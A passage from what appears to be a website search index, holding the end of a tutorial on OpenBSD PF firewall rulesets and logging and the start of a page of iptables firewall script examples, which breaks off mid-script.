from $iface to any keep state Now we activate our new configuration:\npfctl -e -f /etc/pf.conf This configuration is quite restrictive in the sense that generally, we put all instead of “from any to $iface” and we use “quick” extensively.\nAdvanced linkRequirements:\nOur gateway (renton) has 2 interfaces, r10 on the internet side and ne3 on the local network side The first card has a fixed IP (that of our ISP) The second interface on the local network side is configured with the address 192.168.1.1 on the local network in 192.168.1.0/24 We will protect all of this from the outside world, and since we’re paranoid, we’ll do a bit of logging We want to be able to access the internet from our local network without limitations A particular machine (diane) must be accessible via SSH and HTTPS We want to access Free Multipost on the machine (sickboy), it’s just a standard RTSP/UDP stream Our main machine (tommy) would like to make clicka-compliant things like Jabber file transfer work We will allow SSH from the outside # /etc/pf.conf # Network interface declaration ext=\"r10\" int=\"ne3\" # Declaration of ports not to log ports_not_logged = \"{ netbios-ssn, microsoft-ds, epmap, ms-sql-s, 5900 }\" # Declaration of hosts on my local network diane = \"192.168.1.2\" tommy = \"192.168.1.20\" sickboy = \"192.168.1.21\" # Declaration of the port used on the outside to access diane's SSH ssh_diane = \"65322\" set skip on lo match in all scrub (no-df) # First, the main NAT rule for the local network. Here, I don't put \"pass\" because later I explicitly allow all # outgoing traffic. The :network suffix is used to say \"the subnet corresponding to the address of this interface\" nat on $ext from $int:network to any -\u003e $ext # Next, the redirection rules. I added the 'pass' keyword to not do additional filtering on these connections, # otherwise I would have had to add the corresponding ports in the filtering rule for traffic from the outside. # The rtsp stream from Free's multiposte is UDP coming from freeplayer.freebox.fr rdr pass on $ext protoudp from 212.27.38.253 -\u003e $sickboy # We redirect port 8010 used by Jabber for opening incoming file transfers rdr pass on $ext proto tcp to port 8010 -\u003e $tommy # Finally, we redirect SSH (on the specific port used from the outside) and https to diane rdr pass on $ext proto tcp to port $ssh_diane -\u003e $diane port ssh rdr pass on $ext proto tcp to port https -\u003e $diane # We enable antispoofing on the external interface to block packets coming from outside trying to fraudulently # use our address to pass through the filter antispoof for $ext # We don't filter packets on the internal interface pass quick on $int # Now the filtering rules # By default we block and log all packets from the outside block in on $ext log all # We don't want to fill our logs in 5 minutes with the few well-known worms floating around the net. So we block # certain packets without logging them block in on $ext inet proto tcp from any to any port $ports_not_logged # We allow pings from the outside pass in on $ext inet proto icmp from any to any icmp-type { chorep, echoreq, timex, unreach } # We allow SSH from the outside pass in on $ext inet $proto tcp from any to any port ssh flags S/SA keep state # We allow all outgoing traffic (the NATed from the local network will go through these rules) pass out inet proto tcp from $iface to any flags S/SA keep state pass out inet proto { udp, icmp } from $iface to any keep state My Config linkI have a Soekris with several network interfaces:\nWan DMZ Lan Wifi VPN And I want the configuration to be as follows:\nWifi and Lan have access to everything The DMZ only has access to Wan There is NAT on all interfaces except wan obviously Protection against SSH bruteforce VPN is accessible on the gateway from the outside # $OpenBSD: pf.conf,v 1.37 2008/05/09 06:04:08 reyk Exp $ # # See pf.conf(5) for syntax and examples. # Remember to set net.inet.ip.forwarding=1 and/or net.inet6.ip6.forwarding=1 # in /etc/sysctl.conf if packets are to be forwarded between interfaces. #------------------------------------------------------------------------- # Physical and virtual interfaces definitions #------------------------------------------------------------------------- # Physical Interfaces wan_if=\"sis0\" lan_if=\"vr0\" dmz_if=\"sis1\" wifi_if=\"vr1\" # VLAN Interfaces vlan99_if=\"vlan99\" vlan110_if=\"vlan110\" vlan120_if=\"vlan120\" # TUN Interfaces openvpn_if=\"tun0\" sshvpn_if=\"tun1\" #------------------------------------------------------------------------- # Networks definitions #------------------------------------------------------------------------- # Wan wan_net=\"192.168.10.0/24\" # Trusted networks lan_net=\"192.168.0.0/24\" vlan99_net=\"192.168.99.0/24\" wifi_net=\"192.168.200.0/24\" # Remote trusted networks openvpn_net=\"192.168.20.0/24\" openvpn_net_nat=\"10.0.0.0/24\" sshvpn_net=\"192.168.30.0/24\" # DMZ dmz_net=\"192.168.100.0/24\" vlan110_net=\"192.168.110.0/24\" vlan120_net=\"192.168.120.0/24\" # OpenVPN Shenzi network openvpn_shenzi_net=\"192.168.90.0/24\" #------------------------------------------------------------------------- # IP definitions #------------------------------------------------------------------------- # Router IP interfaces wan_sks_ip=\"192.168.10.254\" dmz_sks_ip=\"192.168.100.254\" vlan110_sks_ip=\"192.168.110.254\" vlan120_sks_ip=\"192.168.120.254\" # Others IP dedibox_ip=\"x.x.x.x\" work_ip=\"x.x.x.x\" freebox_tv_ip=\"212.27.38.253\" # Services IP dmz_mail_ip=\"192.168.100.3\" dmz_web_ip=\"192.168.110.2\" dmz_dns_ip=\"192.168.100.3\" dmz_sftp_ip=\"192.168.100.6\" apt_cacher_ip=\"192.168.120.2\" #------------------------------------------------------------------------- # Ports definitions and options #------------------------------------------------------------------------- # Port descriptions imaps_ports=\"143, 993\" smtps_ports=\"25, 465\" ssh_ports=\"22, 222\" dns_port=\"53\" webs_ports=\"80, 443\" openvpn_port=\"1194\" proxy_port=\"3128\" apt_cacher_port=\"3142\" mysql_port=\"3306\" git_port=\"9418\" free_multiposte=\"31336, 31337\" # Whitelist / Blacklist table table persist table persist file \"/etc/ssh/whitelist\" # Do not touch lo interface set skip on lo0 #------------------------------------------------------------------------- # Packet Normalization: reassemble fragments #------------------------------------------------------------------------- match in all scrub (no-df) #------------------------------------------------------------------------- # Nat for all internal interfaces #------------------------------------------------------------------------- match out on $wan_if from !($wan_if) nat-to ($wan_if) #------------------------------------------------------------------------- # block in all with no usurpation #------------------------------------------------------------------------- block in log all block in log quick from urpf-failed #------------------------------------------------------------------------- # Redirections for incoming connections (wan) #------------------------------------------------------------------------- # From WAN pass in on $wan_if proto tcp from any to $wan_if port 25 rdr-to $dmz_mail_ip port 25 pass in on $wan_if proto udp from any to $wan_if port $dns_port rdr-to $dmz_dns_ip port $dns_port pass in on $wan_if proto tcp from any to $wan_if port $dns_port rdr-to $dmz_dns_ip port $dns_port pass in on $wan_if proto tcp from any to $wan_if port 80 rdr-to $dmz_web_ip port 80 pass in on $wan_if proto tcp from any to $wan_if port 143 rdr-to $dmz_mail_ip port 143 pass in on $wan_if proto tcp from any to $wan_if port 222 rdr-to $dmz_sftp_ip port 22 pass in on $wan_if proto tcp from any to $wan_if port 443 rdr-to 127.0.0.1 port 443 pass in on $wan_if proto tcp from any to $wan_if port 465 rdr-to $dmz_mail_ip port 465 pass in on $wan_if proto tcp from any to $wan_if port 993 rdr-to $dmz_mail_ip port 993 pass in on $wan_if proto tcp from any to $wan_if port 9418 rdr-to $dmz_web_ip port 9418 # Apt-cacher-ng pass in on $vlan120_if proto tcp from any to $vlan120_if port $apt_cacher_port rdr-to $apt_cacher_ip port $apt_cacher_port pass in on $wan_if proto tcp from $dedibox_ip to $wan_if port $mysql_port rdr-to $dmz_web_ip port $mysql_port pass in on $wan_if proto udp from $freebox_tv_ip to $wan_if rdr-to 192.168.0.100 pass in on $wan_if proto tcp from $freebox_tv_ip to $wan_if rdr-to 192.168.0.100 #------------------------------------------------------------------------- # Global Rules pass and block #------------------------------------------------------------------------- # Allow Free Multiposte pass in quick on $wan_if proto udp from $freebox_tv_ip to 192.168.0.100 pass out quick on $wan_if proto udp from $freebox_tv_ip to 192.168.0.100 pass in quick on $wan_if proto tcp from $freebox_tv_ip to 192.168.0.100 pass out quick on $wan_if proto tcp from $freebox_tv_ip to 192.168.0.100 # Allow all outgoing from $lan_net, $wifi_net and $openvpn_net pass in on { $lan_if, $vlan99_if, $wifi_if, $openvpn_if, $sshvpn_if } from { $lan_net, $vlan99_net, $wifi_net, $openvpn_net, $sshvpn_net } to any pass out on { $lan_if, $vlan99_if, $wifi_if, $openvpn_if, $sshvpn_if } from { $lan_net, $vlan99_net, $wifi_net, $openvpn_net, $sshvpn_net } to any pass out on $wan_if from $wan_net to any antispoof quick for { $wan_if, $dmz_if, $vlan110_if, $vlan120_if } # block all incoming on lan_if, wifi_if and openvpn_if block out log on { $lan_if, $vlan99_if, $wifi_if, $openvpn_if, $sshvpn_if } from { !$lan_if, !$vlan99_if, !$wifi_if, !($openvpn_if), !($sshvpn_if) } to any #------------------------------------------------------------------------- # VPN Access #------------------------------------------------------------------------- # Allow to access shenzi VE pass out on $openvpn_if from any to $openvpn_shenzi_net #------------------------------------------------------------------------- # Specific ports on dmz #------------------------------------------------------------------------- # DNS pass in on $dmz_if proto tcp from $dmz_dns_ip to $dmz_sks_ip port $dns_port pass in on $dmz_if proto udp from $dmz_dns_ip to $dmz_sks_ip port $dns_port # Apt-cacher pass out on $vlan120_if proto tcp to ($vlan120_if) port $apt_cacher_port pass in on $vlan120_if proto tcp to ($vlan120_if) port $apt_cacher_port # DMZ and Vlan autorisations #pass in on $vlan110_if from $vlan110_net to { !$lan_net, !$wifi_net, !$openvpn_net, !$sshvpn_net, !$vlan120_net, !$vlan110_sks_ip } # Arrive pas a avoir juste any -\u003e 3142 pass in on $vlan110_if from $vlan110_net to { !$lan_net, !$wifi_net, !$openvpn_net, !$sshvpn_net, !$vlan110_sks_ip } pass in on $vlan120_if from $vlan120_net to { !$lan_net, !$wifi_net, !$openvpn_net, !$sshvpn_net, !$vlan120_sks_ip } pass in on $dmz_if from $dmz_net to { !$lan_net, !$wifi_net, !$openvpn_net, !$sshvpn_net, !$dmz_sks_ip } #------------------------------------------------------------------------- # Specific Rules pass and block #------------------------------------------------------------------------- # Allow all incoming ICMP pass in on $wan_if proto icmp to any # Autoblacklist on SSH pass in on $wan_if proto tcp from ! to ($wan_if) port { $ssh_ports } \\ flags S/SA keep state \\ (max-src-conn-rate 3/60, \\ overload flush global) pass in on $wan_if proto tcp from to $wan_if port { $ssh_ports } flags S/SA keep state # block the ssh bruteforce bastards block drop in on $wan_if from pass in on $wan_if proto tcp from port { $ssh_ports } # Allow OpenVPN pass in on $wan_if proto tcp to $wan_if port $openvpn_port # Allow DNS TCP from DMZ (Bind SRV) to secondary (Soekris) #pass in quick on $dmz_if proto tcp from $dmz_dns_ip to $dmz_sks_ip port $dns_port # Allow on wan interface from wan for tcp pass out on $wan_if proto tcp to ($wan_if) port { $ssh_ports, $smtps_ports, $imaps_ports, $dns_port, $webs_ports, $git_port, $mysql_port } # Allow on dmz interface from wan for udp pass out on $wan_if proto udp to ($dmz_if) port { $dns_port } # Allow all outbound traffic pass out inet from !($wan_if) to any flags S/SA keep state Logs linkWhen PF wants to report something, it will send binary information (to make it more fun, it’s standard PCAP/TCPdump) to a pseudo interface (pflog0), and one of its good friends pflogd will store everything in /var/log/pflog.\nFirst, you need to enable/start the pflogd daemon. Normally it should start automatically if PF is enabled when the machine boots. If not:\nifconfig pflog0 up \u0026\u0026 pflogd We can check that everything is working properly:\nps waux Now that PF is talking on pflog0, when a packet matches a rule where the log keyword is used, let’s move on to tcpdump. It can be used in 2 modes:\nInteractive: tcpdump -n -e -ttt -i pflog0 It will directly read what’s happening live on pflog0, so pflogd will be useful.\nPassive: tcpdump -r /var/log/pflog It will read what has been recorded by pflogd in its output file.\nYou can also pass an expression to tcpdump for it to filter its output according to specific criteria:\ntcpdump -ttt -r /var/log/pflog port 80 and host 192.168.1.2 Finally, tcpdump also understands PF configuration syntax. So we can ask it things like:\ntcpdump -ttt -i pflog0 inbound and action pass and on wi0 With this command, it will only show packets allowed to pass through, logged and incoming on the wi0 interface. tcpdump can also read information such as passive OS fingerprint.\nAdvanced PF Functions linkIf you want to block Windows 95/98 machines for example:\nblock in on $ext proto tcp from any os { \"Windows 95\", \"Windows 98\" } to any port smtp To get the list of OS that PF recognizes:\npfctl -so To do OS analysis with tcpdump:\ntcpdump -o -r /var/log/pflog Obviously these techniques are CPU intensive and not infallible.\nFAQ linkno IP address found for tun0 linkIf you get these kinds of messages, it’s because an interface (here tun0) is trying to be initialized with PF, while the associated service (supposed to create this device) hasn’t started yet.\nTo avoid chaos, just try to put your devices in parentheses (!($vpn_if)) eg:\nblock out quick on { $wifi_if } from { !$lan_if, !$wifi_if, !($vpn_if) } to any And if parentheses already exist, try to remove them.\nResources linkDocumentation for Securing your BSD with PF\nFirewalling with OpenBSD’s PF packet Filter\nPacket filtering with IPFilter software\nhttps://www.openbsd.org/faq/pf/filter.html\n"
            }
        );
    index.add(
            {
                id:  413 ,
                href: "\/Exemples_de_configurations\/",
                title: "Iptables: Configuration Examples",
                description: "Various iptables configuration examples from basic to complex for firewall setup",
                content: "Introduction linkIptables is not very intuitive, and examples are almost essential for setting up your configuration. Here are some examples ranging from the simplest to the most complex.\nExample 1 link #!/bin/sh ################################################ # # # Basic Firewall Script # # # ################################################ ############# # Variables # ############ IPTABLES=/sbin/iptables IF_EXT=eth0 IP_SSH=xx.xx.xx.xx ################### # Clear tables # ################## ${IPTABLES} -t mangle -F ${IPTABLES} -t nat -F ${IPTABLES} -F ${IPTABLES} -t mangle -X ${IPTABLES} -t nat -X ${IPTABLES} -X ${IPTABLES} -Z ##################### # Default rules # #################### ## ignore_echo_broadcasts, TCP Syncookies, ip_forward echo 1 \u003e /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts ## Default Policy ${IPTABLES} -P INPUT DROP ${IPTABLES} -P OUTPUT DROP ${IPTABLES} -P FORWARD DROP ## Accept loopback ${IPTABLES} -A FORWARD -i lo -o lo -j ACCEPT ${IPTABLES} -A INPUT -i lo -j ACCEPT ${IPTABLES} -A OUTPUT -o lo -j ACCEPT ## REJECT connections pretending to initialize without syn ${IPTABLES} -A INPUT -p tcp ! --syn -m state --state NEW,INVALID -j REJECT #################### # Special rules # ################### ### Create chains ${IPTABLES} -N SPOOFED ${IPTABLES} -N SERVICES ### Prohibit spoofed packets ${IPTABLES} -A SPOOFED -s 127.0.0.0/8 -j DROP ${IPTABLES} -A SPOOFED -s 169.254.0.0/12 -j DROP ${IPTABLES} -A SPOOFED -s 172.16.0.0/12 -j DROP ${IPTABLES} -A SPOOFED -s 192.168.0.0/16 -j DROP ${IPTABLES} -A SPOOFED -s 10.0.0.0/8 -j DROP ### Allowed INPUT ### ICMP ## Ping (*) ${IPTABLES} -A INPUT -p icmp --icmp-type echo-request -j ACCEPT ### TCP ## SSH (*) ${IPTABLES} -A SERVICES -p tcp -d ${IP_SSH} --dport 22 -j ACCEPT ## MAIL (*) ${IPTABLES} -A SERVICES -p tcp -d ${IP_SSH} --dport 25 -j ACCEPT ################################# # Open ports on the firewall # ################################ ${IPTABLES} -A OUTPUT -j ACCEPT ${IPTABLES} -A INPUT -m state --state ESTABLISH,RELATED -j ACCEPT ${IPTABLES} -A INPUT -j SPOOFED ${IPTABLES} -A INPUT -i ${IF_EXT} -j SERVICES Example 2 link #!/bin/bash echo Setting firewall rules... ###### Initialization Start ###### # Block all incoming connections iptables -t filter -P INPUT DROP iptables -t filter -P FORWARD DROP echo - Block all incoming connections: [OK] # Block all outgoing connections iptables -t filter -P OUTPUT DROP echo - Block all outgoing connections: [OK] # Clear current tables iptables -t filter -F iptables -t filter -X echo - Clearing: [OK] # Allow SSH iptables -t filter -A INPUT -p tcp --dport 22 -j ACCEPT echo - Allow SSH: [OK] # Don't break established connections iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT iptables -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT echo - Don't break established connections: [OK] ###### End Initialization ###### ##### Begin Rules ###### # Allow DNS, FTP, HTTP, NTP requests iptables -t filter -A OUTPUT -p tcp --dport 21 -j ACCEPT iptables -t filter -A OUTPUT -p tcp --dport 80 -j ACCEPT iptables -t filter -A OUTPUT -p tcp --dport 53 -j ACCEPT iptables -t filter -A OUTPUT -p udp --dport 53 -j ACCEPT iptables -t filter -A OUTPUT -p udp --dport 123 -j ACCEPT echo - Allow DNS, FTP, HTTP, NTP requests: [OK] # Allow loopback iptables -t filter -A INPUT -i lo -j ACCEPT iptables -t filter -A OUTPUT -o lo -j ACCEPT echo - Allow loopback: [OK] # Allow ping iptables -t filter -A INPUT -p icmp -j ACCEPT iptables -t filter -A OUTPUT -p icmp -j ACCEPT echo - Allow ping: [OK] # HTTP iptables -t filter -A INPUT -p tcp --dport 80 -j ACCEPT iptables -t filter -A INPUT -p tcp --dport 443 -j ACCEPT iptables -t filter -A INPUT -p tcp --dport 8443 -j ACCEPT echo - Allow Apache server: [OK] # FTP modprobe ip_conntrack_ftp iptables -t filter -A INPUT -p tcp --dport 20 -j ACCEPT iptables -t filter -A INPUT -p tcp --dport 21 -j ACCEPT iptables -t filter -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT echo - Allow FTP server: [OK] # Mail iptables -t filter -A INPUT -p tcp --dport 25 -j ACCEPT iptables -t filter -A INPUT -p tcp --dport 110 -j ACCEPT iptables -t filter -A INPUT -p tcp --dport 143 -j ACCEPT iptables -t filter -A OUTPUT -p tcp --dport 25 -j ACCEPT iptables -t filter -A OUTPUT -p tcp --dport 110 -j ACCEPT iptables -t filter -A OUTPUT -p tcp --dport 143 -j ACCEPT echo - Allow Mail server: [OK] ###### End Rules ###### echo Firewall successfully updated! Example 3 link # description: Firewall rules with masquerading # probe: true # ### BEGIN INIT INFO # Provides: firewall_passerelle # Required-Start: $network # Required-Stop: $network # Default-Start: 3 5 # Default-Stop: # Description: Firewall rules with masquerading (configurable) ### END INIT INFO #################################################################### # INTRODUCTION #################################################################### ## Make sure we are root if [ ! \"`id 2\u003e\u00261 | egrep 'uid=0' | cut -d '(' -f1`\" = \"uid=0\" ]; then echo \"This script must be run by the 'root' user\" exit 1 ## Exit the script fi # If iptables utility is not installed, exit with an error # Note: the path to the IPTABLES utility may vary from one # system to another IPT=\"/sbin/iptables\" [ -x ${IPT} ] || { echo \"Unable to find the path for iptables\" exit 1 } # Internet connection interface # This variable is mandatory OUT=\"ppp0\" # If the following line is uncommented, the machine # is not configured in gateway mode and only serves # as a firewall IN=\"eth0\" # private network interface if applicable # Uncomment the following line to enable protocol filtering # when using in gateway mode #FILTRAGE=\"-p tcp -m multiport --destination-port 6667,5190\" # let's see how we were called case \"$1\" in start) ;; stop) ${IPT} -t filter -F ${IPT} -t nat -F ${IPT} -t filter -X ${IPT} -t filter -Z ${IPT} -t filter -P INPUT ACCEPT ${IPT} -t filter -P OUTPUT ACCEPT ${IPT} -t filter -P FORWARD ACCEPT /bin/echo \"0\" \u003e /proc/sys/net/ipv4/ip_forward exit 0 ;; restart) $0 stop $0 start ;; *) echo \"Usage: $0 {start|stop|restart}\" exit 1 esac # Load modules modprobe ip_tables modprobe ip_conntrack modprobe ip_conntrack_ftp modprobe ip_conntrack_irc modprobe ip_conntrack_h323 # Clear all rules and chains ${IPT} -t filter -F ${IPT} -t nat -F ${IPT} -t filter -X ${IPT} -t filter -Z # Configure default behavior (Policy) ${IPT} -P INPUT DROP ${IPT} -P OUTPUT DROP ${IPT} -P FORWARD DROP #################################################################### # Kernel flags #################################################################### # Enable TCP SYN Cookie protection (repeated connection requests) #/bin/echo \"1\" \u003e /proc/sys/net/ipv4/tcp_syncookies # Ignore ping responses #/bin/echo \"1\" \u003e /proc/sys/net/ipv4/icmp_echo_ignore_all # Disable ICMP broadcast responses /bin/echo \"1\" \u003e /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts # Don't accept source routed packets. Attackers can use source # routing to generate traffic pretending to be from inside your # network, but which is routed back along the path which it came, # namely outside, so attackers can compromise your network. # Source routing is rarely used for legitimate purposes. /bin/echo \"0\" \u003e /proc/sys/net/ipv4/conf/all/accept_source_route # Disable ICMP Redirect Acceptance /bin/echo \"0\" \u003e /proc/sys/net/ipv4/conf/all/accept_redirects # Enable bad error message protection /bin/echo \"1\" \u003e /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses # To prevent IP SPOOFING, check the source address on all # interfaces - can cause issues with asymmetric routing # (packets take different paths in each direction) for interface in /proc/sys/net/ipv4/conf/*/rp_filter; do /bin/echo \"1\" \u003e ${interface} done # Log Spoofed Packets, Source Routed Packets, Redirect Packets for interface in /proc/sys/net/ipv4/conf/*/log_martians; do /bin/echo \"1\" \u003e ${interface} done # For dynamic IP address echo \"1\" \u003e /proc/sys/net/ipv4/ip_dynaddr # Enable IP packet routing # This is the main command authorizing the gateway function if [ ${IN} ]; then /bin/echo \"1\" \u003e /proc/sys/net/ipv4/ip_forward else /bin/echo \"0\" \u003e /proc/sys/net/ipv4/ip_forward fi #################################################################### # Rules #################################################################### # Unlimited traffic on loopback address ${IPT} -A INPUT -i lo -j ACCEPT ${IPT} -A OUTPUT -o lo -j ACCEPT # Unlimited traffic on other Ethernet interfaces # Avoid touching the public network interface # (connected to the Internet) for interface in /proc/sys/net/ipv4/conf/eth*; do VAL=`echo ${interface} | cut -c 25-` if [ ${VAL} != ${OUT} ]; then ${IPT} -A INPUT -i ${VAL} -j ACCEPT ${IPT} -A OUTPUT -o ${VAL} -j ACCEPT fi done # transparent proxy: redirection rule to the proxy # we consider that eth0 is the private network interface # and 3128 is the proxy-cache server port #${IPT} -t nat -A PREROUTING -p tcp -i eth0 --dport 80 -j REDIRECT --to-port 3128 # If gateway function is enabled if [ ${IN} ]; then # Accept forwarding packets on the internal interface ${IPT} -A FORWARD -i ${IN} ${FILTRAGE} -j ACCEPT ${IPT} -A FORWARD -o ${IN} -j ACCEPT # Enable masquerading for traffic from the private # subnet (For fixed IP, SNAT is better) ${IPT} -t nat -A POSTROUTING -o ${OUT} -j MASQUERADE fi # Accept outgoing connections from the # private subnet ${IPT} -A OUTPUT -o ${OUT} -j ACCEPT # # Add rules to authorize certain ports # Uncomment the lines that interest you # ## Simultaneous access to a web server and FTP #${IPT} -A INPUT -i ${OUT} -p tcp -m state --state NEW -m multiport --destination-port 80,20,21 -j ACCEPT ## Access only to a web server #${IPT} -A INPUT -i ${OUT} -p tcp -m state --state NEW --destination-port 80 -j ACCEPT ## gtk-gnutella #${IPT} -A INPUT -i ${OUT} -p tcp -m state --state NEW --destination-port 23934 -j ACCEPT #${IPT} -A INPUT -i ${OUT} -p udp -m state --state NEW --destination-port 23934 -j ACCEPT ## SSH ${IPT} -A INPUT -i ${OUT} -p tcp --destination-port 22 -j ACCEPT ## HTTP ${IPT} -A INPUT -i ${OUT} -p tcp --destination-port 80 -j ACCEPT # Mldonkey ${IPT} -A INPUT -i ${OUT} -p tcp --destination-port 6666 -j ACCEPT ${IPT} -A INPUT -i ${OUT} -p tcp --destination-port 6682 -j ACCEPT ${IPT} -A INPUT -i ${OUT} -p tcp --destination-port 8155 -j ACCEPT ## Jabber file transfer #${IPT} -A INPUT -i ${OUT} -p udp --destination-port 8010 -j ACCEPT # # End of rule addition # # Accept already established incoming connections ${IPT} -A INPUT -i ${OUT} -m state --state ESTABLISHED,RELATED -j ACCEPT # If gateway function is enabled if [ ${IN} ]; then # Track rejected packets on the FORWARD chain ${IPT} -N LOG_FWD ${IPT} -A LOG_FWD -j LOG --log-level info --log-ip-options --log-prefix \"Firewall FWD:\" ${IPT} -A LOG_FWD -j DROP # Log rejected packets on the FORWARD chain ${IPT} -A FORWARD -j LOG_FWD fi # Initialize tracking for rejected input packets on # the external interface ${IPT} -N LOG_EXT ${IPT} -A LOG_EXT -j LOG --log-level info --log-ip-options --log-prefix \"Firewall IN:\" ${IPT} -A LOG_EXT -j DROP # Log rejected input packets on the external interface ${IPT} -A INPUT -i ${OUT} -j LOG_EXT exit 0 Example 4 link #!/bin/bash ################################################### ## ARCHITECTURE FOR A 4-INTERFACE FIREWALL ## ##\t## ##\tINTERNET\t## ##\t| ## ##\tDMZ--------FIREWALL--------SERVER ZONE ## ##\t|\t## ##\tLAN\t## ##\t## ################################################### ################################################### ## REQUIRED IPTABLES MODULES ## ################################################### MODULES_IPTABLES=\"ip_tables \\ ipt_string \\ ip_conntrack \\ ip_conntrack_ftp \\ ip_nat_ftp\"\t# Iptables modules loaded at startup INTERNET=\"ppp0\" # Internet device (multiple devices possible) INTERNET_NAT=\"ppp0\" # Internet device used for NAT (only 1 device possible) DMZ=\"\" # DMZ device (public IPs, servers accessible from internet) ZONE_SERVEURS=\"eth2\"\t# Server zone device (private IPs, servers accessible internally) LAN=\"eth1 eth3\"\t# Intranet device (multiple devices possible) PAQUETS_ICMP_AUTHORISES=\"0 3 4 5 8 11 12\"\t# ICMP packets authorized to travel between different networks PING_FLOOD=\"1/s\"\t# Number of PING authorized per second LOG_FLOOD=\"1/s\" PROTOCOLES_AUTHORISES=\"47\"\t# Protocols authorized to pass through the firewall MASQ_LAN=\"YES\" # Masquerade the LAN MASQ_DMZ=\"NO\" # Masquerade the DMZ MASQ_ZONE_SERVEURS=\"YES\" # Masquerade the server zone PORTS_TCP_INTERNET_AUTHORISES=\"53\"\t# TCP ports of the firewall accessible from the internet PORTS_UDP_INTERNET_AUTHORISES=\"53\"\t# UDP ports of the firewall accessible from the internet PORTS_TCP_DMZ_AUTHORISES=\"\"\t# TCP ports of the firewall accessible from the DMZ PORTS_UDP_DMZ_AUTHORISES=\"\"\t# UDP ports of the firewall accessible from the DMZ PORTS_TCP_ZONE_SERVEURS_AUTHORISES=\"53 113\"\t# TCP ports of the firewall accessible from the server zone PORTS_UDP_ZONE_SERVEURS_AUTHORISES=\"53 113\"\t# UDP ports of the firewall accessible from the server zone PORTS_TCP_LAN_AUTHORISES=\"53 113 22\"\t# TCP ports of the firewall accessible from the LAN PORTS_UDP_LAN_AUTHORISES=\"53 113 22\"\t# UDP ports of the firewall accessible from the LAN PORTS_TCP_SORTIE_REFUSES=\"6346 \\ 7777 \\ 8888 \\ 6699 \\ 6000\" # TCP ports forbidden for output from the firewall PORTS_UDP_SORTIE_REFUSES=\"6346 \\ 7777 \\ 8888 \\ 6699 \\ 6000\" # UDP ports forbidden for output from the firewall RESEAUX_LAN=\"192.168.10.0/24 \\ 192.168.30.0/24\" # Networks composing the LAN RESEAUX_DMZ=\"\" # Networks composing the DMZ RESEAUX_ZONE_SERVEURS=\"192.168.50.0/24\" # Networks composing the server zone NAT_TCP_NET=\" 80.13.192.105:80\u003e192.168.50.100:8080 \" # NAT =\u003e IP_FIREWALL:PORT_FIREWALL\u003eIP_INTERNAL:PORT_INTERNAL NAT_UDP_NET=\"\" # NAT =\u003e IP_FIREWALL:PORT_FIREWALL\u003eIP_INTERNAL:PORT_INTERNAL MOTS_CLES=\"root admin\" # Keywords to log MOTS_CLES_INTERDITS=\"mp3\u003e192.168.10.117 \\ MP3\u003e192.168.10.117 \\ ogg\u003e192.168.10.117 \\ OGG\u003e192.168.10.117\" # Forbidden keywords ;-) KEYWORD\u003eRECIPIENT_IP IP_INTERDITES=\" 66.28.48.0/24 \\ 66.28.49.0/24\"\t# Addresses blocked from entry ################################################### ## SCRIPT VARIABLES (DO NOT EDIT) ## ################################################### IPTABLES=`which iptables` MODPROBE=`which modprobe` VERT=\"\\033[32m\" JAUNE=\"\\033[33m\" GRAS=\"\\033[1m\" NORMAL=\"\\033[m\" ROUGE=\"\\033[31m\" ################################################### ## VERIFY IPTABLES PRESENCE ## ################################################### echo -en \"${GRAS}Verifying IPTABLES presence:${NORMAL}\" if [ -z ${IPTABLES} ] ;then echo -e \"\\t\\t${ROUGE}FAILED${NORMAL}\\n\" exit 1 else echo -e \"\\t\\t${VERT}OK${NORMAL}\" fi ################################################### ## VERIFY MODPROBE PRESENCE ## ################################################### echo -en \"${GRAS}Verifying MODPROBE presence:${NORMAL}\" if [ -z ${MODPROBE} ] ;then echo -e \"\\t\\t${ROUGE}FAILED${NORMAL}\\n\" exit 1 else echo -e \"\\t\\t${VERT}OK${NORMAL}\\n\" fi ################################################### ## LOADING IPTABLES MODULES ## ################################################### for module in ${MODULES_IPTABLES} ;do echo -e \"${GRAS}Loading module ${module}:${NORMAL}\\t\\t\\t${VERT}OK${NORMAL}\" ${MODPROBE} ${module} done echo -e \"\\n\" ################################################### ## BASIC FIREWALL CONFIGURATION USING ## ## /proc FILESYSTEM ## ################################################### ################################################### ## ENABLE IP FORWARDING (routing) ## ################################################### echo -en \"${GRAS}${JAUNE}Enabling ip forwarding:${NORMAL}\" if [ -e /proc/sys/net/ipv4/ip_forward ] ; then echo 1 \u003e /proc/sys/net/ipv4/ip_forward echo -e \"\\t\\t\\t\\t${VERT}OK${NORMAL}\" else echo -e \"\\t\\t\\t\\t${ROUGE}FAILED${NORMAL}\\n\" exit 1 fi ################################################### ## Protection against SYN FLOOD ## ################################################### echo -en \"${GRAS}${JAUNE}Protection against SYN/FLOOD:${NORMAL}\" if [ -e /proc/sys/net/ipv4/tcp_syncookies ] ; then echo 1 \u003e /proc/sys/net/ipv4/tcp_syncookies echo -e \"\\t\\t\\t${VERT}OK${NORMAL}\" else echo -e \"\\t\\t\\t${ROUGE}FAILED${NORMAL}\" fi ################################################### ## Defragment packets before forwarding them ## ## Useful for masquerading ## ################################################### echo -en \"${GRAS}${JAUNE}Packet refragmentation:${NORMAL}\" if [ -e /proc/sys/net/ipv4/ip_always_defrag ] ; then echo 1 \u003e /proc/sys/net/ipv4/ip_always_defrag echo -e \"\\t\\t\\t\\t${VERT}OK${NORMAL}\" else echo -e \"\\t\\t\\t\\t${ROUGE}FAILED${NORMAL}\" fi ################################################### ## Don't respond to ICMP packets ## ## sent to broadcast ## ################################################### echo -en \"${GRAS}${JAUNE}Insensitivity to ICMP packets sent to broadcast:${NORMAL}\" if [ -e /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts ] ; then echo 1 \u003e /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts echo -e \"\\t${VERT}OK${NORMAL}\" else echo -e \"\\t${ROUGE}FAILED${NORMAL}\" fi ################################################### ## Ignore ICMP errors from hosts ## ## on the network reacting poorly to frames ## ## sent to what they perceive as ## ## the broadcast address ## ################################################### if [ -e /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses ] ; then echo 1 \u003e /proc/sys/net/ipv4/icmp_ignore_bogus_error_responses fi ################################################### ## Reverse Path Filtering ## ## Only route packets belonging to ## ## our networks ## ################################################### echo -e 